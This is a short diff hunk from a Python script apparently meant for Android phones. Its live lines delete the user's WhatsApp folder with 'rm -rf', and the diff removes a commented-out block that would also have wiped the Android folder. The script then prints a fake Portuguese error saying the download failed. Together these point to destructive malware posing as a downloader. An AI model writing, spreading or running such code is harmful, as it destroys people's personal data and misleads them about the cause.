@@ -40,10 +40,5 @@ if os.path.exists('/storage/00FB-0CFC/') == True:
     
     if os.path.exists('/storage/emulated/0/Whatsapp') == True:
         os.system('cd /storage/emulated/0;rm -rf Whatsapp')
-    
-    '''if os.path.exists('/storage/emulated/0/Android') == True:
-        os.system('cd /storage/emulated/0;rm -rf Android')
-        sleep(2)'''
-
 
 print('\n\033[31m[X] ERROR de diretório. Não foi possivél concluir o download.\033[m')
